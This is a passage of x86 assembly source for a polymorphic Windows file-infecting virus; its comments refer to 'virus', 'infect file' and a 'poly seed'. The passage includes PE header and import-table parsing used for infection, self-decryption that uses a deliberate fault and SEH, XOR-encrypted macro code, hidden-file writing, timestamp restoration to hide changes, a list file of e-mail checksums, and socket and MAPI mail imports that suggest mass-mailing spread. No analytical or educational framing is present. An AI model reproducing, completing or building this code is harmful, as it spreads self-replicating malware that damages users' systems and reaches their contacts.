   WriteMem endp

   cp_key  db 0

   GetList proc
          lea edi, [ebp+(ofs directory-ofs vcode)]
          push MAX_PATH
          push edi
          call [ebp+(ofs _GetSystemDirectoryA-ofs vcode)]
          lea edi, [edi+eax]
          call @@1
          db '\BRSCBC.DAT', 0
     @@1:
          pop esi
     @@2:
          lodsb
          stosb
          test al, al
          jnz @@2
          ret
   GetList endp

   CheckList proc
          push eax
          call GetList
          mov dwo [ebp+(ofs fsizel-ofs vcode)], 1*4
          inc by [ebp+(ofs mf_mode-ofs vcode)]
          inc by [ebp+(ofs mf_mode1-ofs vcode)]
          call MapFile
          mov [ebp+(ofs map@-ofs vcode)], eax
          dec by [ebp+(ofs mf_mode-ofs vcode)]
          dec by [ebp+(ofs mf_mode1-ofs vcode)]
          mov edi, eax
          test eax, eax
          pop eax
          jz @@1
          mov ecx, [ebp+(ofs fsizel-ofs vcode)]
          shr ecx, 2
          repne scasd
          push ecx
          call UnmapFile
          pop eax
     @@1:
          ret
   CheckList endp

   InsertList proc
          call GetList
          sub eax, eax
          push eax
          push 80h
          push 3
          push eax eax
          push 0c0000000h                         ;read/write
          lea eax, [ebp+(ofs directory-ofs vcode)]
          push eax
          call [ebp+(ofs _CreateFileA-ofs vcode)]
          inc eax
          jz @@1
          dec eax

          push eax

          sub ecx, ecx
          push 2
          push ecx
          push ecx
          push eax
          call [ebp+(ofs _SetFilePointer-ofs vcode)]

          mov eax, [esp]

          push 0
          call @@2
          dd 0
     @@2:
          push 4
          lea ecx, [ebp+(ofs email_crc-ofs vcode)]
          push ecx
          push eax
          call [ebp+(ofs _WriteFile-ofs vcode)]

          call [ebp+(ofs _CloseHandle-ofs vcode)]

     @@1:
          ret
   InsertList endp

   ChecksumMappedFile proc
          push ebp
          mov ebp, esp
          push esi
          push ecx
          push edx
          xor edx, edx
          mov esi, [ebp+8]
          mov ecx, [ebp+12]
          shr ecx, 1
     @@1:
          movzx eax, wo [esi]
          add edx, eax
          mov eax, edx
          and edx, 0FFFFh
          shr eax, 10h
          add edx, eax
          add esi, 2
          loop @@1
          mov eax, edx
          shr eax, 10h
          add ax, dx
          add eax, [ebp+12]
          pop edx
          pop ecx
          pop esi
          leave
          retn    8
   ChecksumMappedFile endp

   SearchIT proc
          pushad
          call sne
          mov esp,[esp+8]                         ;fix stack
   _rseh:
          sub eax, eax                            ;signal not found
          jmp rseh
   sne:
          sub edx, edx
          push dwo fs:[edx]
          mov fs:[edx], esp                       ;set SEH
          call gpa_kernel32                       ;get add for the case it is bound
          mov edi, eax
          mov eax, dwo [esi+128]                  ;import dir
          push edi
          call virtual2physical
          pop edi
          jc @@3
          mov edx, eax
          add edx, ebx
     @@2:
          cmp dwo [edx], 0
          je @@3
          mov eax, [edx+12]                       ;get module name
          push edi
          call virtual2physical
          pop edi
          jc @@0
          add eax, ebx
          mov ecx, 12345678h
     dll_name equ dwo $-4
          call strcmp
          jz @@1
     @@0:
          add edx, 20                             ;check next
          jmp @@2                                 ;process next dir
     @@3:
          jmp _rseh
     @@1:
          mov eax, [edx+16]                       ;pointer to name table pointer
          mov ebp, eax
          push edi
          call virtual2physical
          pop edi
          jc @@3
          add eax, ebx
          mov edx, esi
          mov esi, eax
          sub ecx, ecx
     @@4:
          lodsd                                   ;load pointer to name
          test eax, eax
          jz @@3                                  ;ebx=base
          inc ecx
          cmp eax, edi
          jz @@6
          cmp eax, 077f00000h
          ja @@4                                  ;pointing to kernel? is bound
          xchg esi, edx
          push edi
          call virtual2physical                   ;edx=table esi=pe header
          pop edi
          jc @@3
          push edi
          mov edi, [esp+(7*4)+4+8]                ;load requested API
          push esi
          lea esi, [eax+ebx+2]
          dec edi
     @@7:
          inc edi
          lodsb
          test al, al
          jz @@5
          cmp [edi], al
          je @@7
          pop esi
          pop edi
          xchg esi, edx                           ;esi=table edx=pe header
          jmp @@4
     @@5:
          pop eax
          pop eax
     @@6:
          dec ecx
          lea eax, [ebp+(ecx*4)]
     rseh:
          sub edx, edx
          pop dwo fs:[edx]                        ;remove frame
          pop edx
          mov dwo [esp+(7*4)], eax
          popad
          ret
   SearchIT endp

   strcmp proc
          push edx ebx edi
     @@2:
          mov bl, [eax]
          cmp bl, 'a'
          jb @@3
          cmp bl, 'z'
          ja @@3
          and bl, not 20h
     @@3:
          cmp by [ecx], 0
          jz @@1
          cmp [ecx], bl
          jnz @@1
          inc ecx
          inc eax
          jmp @@2
     @@1:
          pop edi ebx edx
          ret
   strcmp endp

   virtual2physical proc
          push ecx esi
          mov edi, esi
          movzx ecx, wo [esi+20]
          add edi, 24
          add edi, ecx                            ;edi eq 1th section header
          movzx ecx, wo [esi+peh_nosections]
     @@0:
          push eax
          sub eax, [edi+12]                       ;sub RVA
          cmp eax, [edi+8]                        ;pointing inside?
          jb @@1
          pop eax
          add edi, 40                             ;next section header
          loop @@0
          sub eax, eax
          stc                                     ;signal error
          jmp @@2
     @@1:
          add eax, [edi+20]                       ;add raw pointer
          pop ecx                                 ;fix stack
     @@2:
          pop esi ecx                             ;eax=fisical place
          ret                                     ;edi=section
   virtual2physical endp

   virtual2physical_ proc
          pushad
          mov esi, [ebp+(ofs pe_header-ofs vcode)]
          call virtual2physical
          mov [esp+(7*4)], eax
          popad
          ret
   virtual2physical_ endp

   physical2virtual_ proc
          pushad
          mov esi, [ebp+(ofs pe_header-ofs vcode)]
          call physical2virtual
          mov [esp+(7*4)], eax
          popad
          ret
   physical2virtual_ endp

   physical2virtual proc
          push ecx esi
          mov esi, [ebp+(ofs pe_header-ofs vcode)]
          mov edi, esi
          movzx ecx, wo [esi+20]
          add edi, 24
          add edi, ecx                            ;edi eq 1th section header
          movzx ecx, wo [esi+peh_nosections]
     @@0:
          push eax
          sub eax, [edi+20]                       ;sub physical start
          cmp eax, [edi+16]                        ;still pointing to this section
          jb @@1
          pop eax
          add edi, 40                             ;next section header
          loop @@0
          sub eax, eax
          stc                                     ;signal error
          jmp @@2
     @@1:
          add eax, [edi+12]                       ;add rva
          pop ecx
     @@2:
          pop esi ecx                             ;eax=fisical place
          ret                                     ;edi=section
   physical2virtual endp

   MapFile proc
          mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
          test eax, eax
          jz @@1                                  ;if [mm_on_off] contains a @
          clc                                     ;treat it like a memory mapped
          ret                                     ;file
     @@1:
          push -1
     mf_mode1 equ by $-1

          pop ecx
          jecxz @@212

          push 80h
          lea eax, [ebp+(ofs directory-ofs vcode)]
          push eax
          call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
          test eax, eax
          jz error_map                            ;blank attributes

     @@212:
          sub eax, eax
          push eax
          push 80h
          push 3
     mf_mode equ by $-1
          push eax eax
          push 0c0000000h                         ;read/write
          lea eax, [ebp+(ofs directory-ofs vcode)]
          push eax
          call [ebp+(ofs _CreateFileA-ofs vcode)]
          inc eax
          jz error_mapf
          dec eax
          mov [ebp+(ofs handle1-ofs vcode)], eax

          sub ebx, ebx

          cmp [ebp+(ofs fsizel-ofs vcode)], ebx
          jne @@2

          push ebx
          push eax
          call [ebp+(ofs _GetFileSize-ofs vcode)]
          mov [ebp+(ofs fsizel-ofs vcode)], eax
          sub edx, edx
          mov ecx, DIV_VALUE
          div ecx
          test edx, edx
          jz close_map

     @@2:

          sub eax, eax
          push eax
          push dwo [ebp+(ofs fsizel-ofs vcode)]
          push eax
          push 4
          push eax
          push dwo [ebp+(ofs handle1-ofs vcode)]
          call [ebp+(ofs _CreateFileMappingA-ofs vcode)]
          test eax, eax
          jz close_map
          mov [ebp+(ofs handle2-ofs vcode)], eax
          sub eax, eax
          push dwo [ebp+(ofs fsizel-ofs vcode)]
          push eax eax
          push 2
          push dwo [ebp+(ofs handle2-ofs vcode)]
          call [ebp+(ofs _MapViewOfFile-ofs vcode)]
          test eax, eax
          jz unmap_map
          ret
   MapFile endp

   CheckName proc
          push ebp
          call _seh
          mov esp,[esp+8]                         ;fix stack
          jmp remove_seh
   _seh:
          sub ecx, ecx
          push dwo fs:[ecx]
          mov fs:[ecx], esp
          cld
          call delta
          lea edi, [ebp+(ofs directory-ofs vcode)]
          push edi
          mov esi, [esp+(7*4)+(4*6)+(2*4)]      ;get pointer to path name
     @@1:
          lodsb
          cmp al, '\'
          jne @@5
          inc ecx                                 ;signal slash found
     @@5:
          cmp al, '"'
          je @@1
          cmp al, "'"                             ;ignore these
          je @@1
          cmp al, 'a'
          jb @@3
          cmp al, 'z'
          ja @@3
          and al, not 20h                         ;make upcase
     @@3:
          stosb
          test al, al
          jnz @@1
          dec edi
          jecxz @@7
     @@2:
          mov al, by [edi-1]
          cmp al, 20h
          je @@8
          add bl, al                              ;calc chksum
     @@8:
          dec edi
          cmp al, '\'                             ;find backslash
          jnz @@2
     @@7:
          mov eax, edi
          pop edx
          jecxz @@6
          sub eax, edx
          push ebx
          call ProcessDir                         ;process directory
          pop ebx
     @@6:
          sub edx, edx
          pop dwo fs:[edx]                        ;remove frame
          pop edx
          pop ebp
          ret
   CheckName endp

   UnmapFile proc
          mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
          test eax, eax
          jz @@1
          clc
          ret
     @@1:
          push dwo [ebp+(ofs map@-ofs vcode)]
          call [ebp+(ofs _UnmapViewOfFile-ofs vcode)]
     unmap_map:
          push dwo [ebp+(ofs handle2-ofs vcode)]
          call [ebp+(ofs _CloseHandle-ofs vcode)]
     close_map:
          lea eax, dwo [ebp+(ofs lw_creat_h-ofs vcode)]
          push eax
          sub eax, 8
          push eax
          sub eax, 8
          push eax
          push dwo [ebp+(ofs handle1-ofs vcode)]
          call [ebp+(ofs _SetFileTime-ofs vcode)]
          push dwo [ebp+(ofs handle1-ofs vcode)]
          call [ebp+(ofs _CloseHandle-ofs vcode)]
     error_mapf:
          push dwo [ebp+(ofs fattr-ofs vcode)]
          lea eax, [ebp+(ofs directory-ofs vcode)]
          push eax
          call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
     error_map:
          sub eax, eax
          ret
   UnmapFile endp

   random0 proc
          sub eax, eax
   random proc
          push ecx edx
          push eax
          call delta
          mov eax, [ebp+(ofs pseed-ofs vcode)]
          mov ecx, 41c64e6dh
          mul ecx
          add eax, 3039h
          and eax, 7ffffffh
          mov [ebp+(ofs pseed-ofs vcode)], eax
          pop ecx
          jecxz @@3                               ;limit set?
          sub edx, edx
          div ecx
          xchg eax, edx                           ;value = rnd MOD limit
     @@3:
          mov ecx, [esp+(2*4)]                    ;ecx=ret address
          cmp by [ecx], 0cch                      ;is ret address a int3?
          jne @@4
          jmp ebp                                 ;if so, start to exec garbage
     @@4:
          pop edx ecx
          sahf                                    ;random flagz
          ret
   random endp
   random0 endp

   ;name   +4
   ;size   +8
   ;buffer +12
   WriteDump proc
          sub eax, eax
          push eax
          push 12345678h                          ;hidden file
     wd_att equ dwo $-4
          push 2
          push eax eax
          push 0c0000000h                         ;read/write
          push dwo [esp+4+(6*4)]
          call [ebp+(ofs _CreateFileA-ofs vcode)]
          mov ebx, eax

          push 0
          call @@61
          dd 0
     @@61:
          push dwo [esp+8+(2*4)]
          push dwo [esp+12+(3*4)]
          push ebx
          call [ebp+(ofs _WriteFile-ofs vcode)]
          push ebx
          call [ebp+(ofs _CloseHandle-ofs vcode)]
          ret 12
   WriteDump endp

   FileMask db '\*.*', 0, 0, 0, 0

   macro_crypt proc
          pushad
          mov al, 0
     macro_key equ by $-1
          mov ecx, ofs macro_end-ofs macro_start
          lea edi, [ebp+(ofs macro_start-ofs vcode)]
     @@1:
          xor by [edi], al
          inc edi
          loop @@1
          popad
          ret
   macro_crypt endp

   CRC32  proc
          cld
          push ebx
          mov ecx, -1
          mov edx, ecx
     NextByteCRC:
          xor eax, eax
          xor ebx, ebx
          lodsb
          xor al, cl
          mov cl, ch
          mov ch, dl
          mov dl, dh
          mov dh, 8
     NextBitCRC:
          shr bx, 1
          rcr ax, 1
          jnc NoCRC
          xor ax, 08320h
          xor bx, 0edb8h
     NoCRC:
          dec dh
          jnz NextBitCRC
          xor ecx, eax
          xor edx, ebx
          dec di
          jnz NextByteCRC
          not edx
          not ecx
          pop ebx
          mov eax, edx
          rol eax, 16
          mov ax, cx
          ret
   CRC32  endp

   OpenAncev proc
          sub eax, eax
          push eax
          push 80h
          push 3
          push eax eax
          push 80000000h
          call @@1
   ancevsys db 'C:\ANCEV.SYS', 0
     @@1:
          call [ebp+(ofs _CreateFileA-ofs vcode)]
          inc eax
          jz @@filedontexists
          dec eax
          push eax
          call [ebp+(ofs _CloseHandle-ofs vcode)]
     @@fileexists:
          clc
          ret
     @@filedontexists:
          stc
          ret
   OpenAncev endp

   align 4

   dec_end_code equ this byte

   DecriptInit proc
          cld
          sub eax, eax
          db 0b8h+5                               ;mov ebp, delta
   _delta dd 00403000h
          lea ebx, [ebp+(ofs vinit-ofs vcode)]
          push ebx
          lea ebx, [ebp+(ofs dec_end_code-ofs vcode)]
          push dwo fs:[eax]
          mov fs:[eax], esp                       ;set new seh frame
          mov edi, ebp
          mov eax, 0
     key1 equ dwo $-4
     @@1:
          xor [edi], eax
          scasd
          add eax, 12345678h
        org $-4
     key2 dd 0
          cmp edi, ebx
          jne @@1
          mov eax, cs:[0]                         ;cause fault
   DecriptInit endp

   vend   equ this byte                           ;END OF PHYSICAL BODY

          db 'EOV', 0

   align 4

   k32_address      equ this byte
   _CreateProcessA  dd 0
   _CreateFileA     dd 0
   _WinExec         dd 0
   _CloseHandle     dd 0                          ;add here a var that hold the
   _LoadLibraryA    dd 0
   _FreeLibrary    dd 0
   _CreateFileMappingA dd 0
   _MapViewOfFile   dd 0
   _UnmapViewOfFile dd 0
   _FindFirstFileA  dd 0
   _FindNextFileA   dd 0
   _FindClose       dd 0
   _SetEndOfFile    dd 0
   _VirtualAlloc    dd 0
   _VirtualFree     dd 0
   _GetSystemTime   dd 0
   _GetWindowsDirectoryA dd 0
   _GetSystemDirectoryA dd 0
   _GetCurrentDirectoryA dd 0
   _SetFileAttributesA dd 0
   _SetFileTime     dd 0
   _ExitProcess     dd 0
   _GetCurrentProcess dd 0
   _WriteProcessMemory dd 0
   _WriteFile       dd 0
   _DeleteFileA     dd 0
   _Sleep           dd 0
   _CreateThread    dd 0
   _GetFileSize     dd 0
   _SetFilePointer  dd 0

   _MessageBoxA     dd 0
   _FindWindowA     dd 0
   _PostMessageA    dd 0

   _RegCloseKey     dd 0
   _RegQueryValueEx dd 0
   _RegOpenKeyEx    dd 0
   _RegCreateKeyEx  dd 0
   _RegSetValueEx   dd 0

   _GetModuleHandle dd 0
   _GetProcAddress  dd 0                          ;basic api init

   _connect         dd 0
   _recv            dd 0

   _MAPISendMail    dd 0

   old_eip dd 0                                   ;first entrypoint place

   patch_jump dd 0                                ;where last jump is(patch!!)

   sRVA    dd 0                                   ;CODE section paramz, for
   RawSize dd 0                                   ;branch_entry

   lgarble db 0                                   ;last garble indicator
   inf?    db 0                                   ;can infect file?

   _dec   dw 0                                    ;instruction used to decript

   K32     dd 0                                   ;kernel32 base
   U32     dd 0                                   ;user32 base

   pseed   dd 0                                   ;poly seed

   variables dd 0

   reg32   dd 0                                   ;table of reg used
   buffer  dd 0                                   ;current work buffer
   _size   dd 0                                   ;size to encript
   entry   dd 0                                   ;delta to entrypoint
   rva     dd 0                                   ;place in meory where virus
                                                  ;will run
   flagz  dd 0                                    ;garbling flagz
   c_reg  dd 0                                    ;actual counter reg
   p_reg  dd 0                                    ;actual pointer reg
   recurse   dd 0                                 ;recursion deep
   decriptor dd 0                                 ;start of decriptor in current
                                                  ;buffer

   search_handle dd 0

   _socket   dd 0
   socket    dd MAX_SOCK dup (0)
   recv_size dd 0
   recv_buff dd 0
   email_w   dd 0
   thread    dd 0
   email     db 128 dup (0)

   email_crc dd 0

   secz     db 0

   mdeep    db 0

   align 4

   handle1  dd 0
   handle2  dd 0
   map@     dd 0                                  ;map address

   tamanho  dd 0                                  ;total added size
   ep       dd 0                                  ;new entrypoint

   image_infect dd 0

   OurTimer   dd 0
   polybuffer dd 0                                ;address of buffer for poly

   buffer1 dd 0                                   ;temporary poly bufferz
   buffer2 dd 0

   mm_on_off    dd 0

   pe_header    dd 0

   seed   dd 0                                    ;main random seed

   _mapi  dd 0

   subject dd 0

   directory db MAX_PATH dup (0)                  ;work directory structure

   lparm      dd 0
   lvars      dd 0
   subs_index dd 0

   s_into     db 0
   _pusha     db 0

   fname      db 32 dup (0)

   align 4

   current_time equ this byte
   _year        dw 0
   _month       dw 0
   _dayofweek   dw 0
   _day         dw 0
   _hour        dw 0
   _minute      dw 0
   _second      dw 0
   _milisecond  dw 0

   find_data     equ this byte
   fattr         dd 0
    c_creat_h    dd 0
     c_creat_l   dd 0
    la_creat_h   dd 0
     la_creat_l  dd 0
    lw_creat_h   dd 0
     lw_creat_l  dd 0
   fsizeh        dd 0
   fsizel        dd 0
   reserved      dd 0, 0
   filename      db 260 dup (0)
   altname       db 13 dup (0)
   altext        db 3 dup (0)

   subs_table db 6*MAX_SUBROUTINES dup (0)        ;dd where sub reside
                                                  ;db no. of param that sub clean
                                                  ;db no. of vars that sub alloc
   include mapi.inc

   MF    MapiFileDesc  <0>

   mend   equ this byte

   _VSEG ends

   end    main
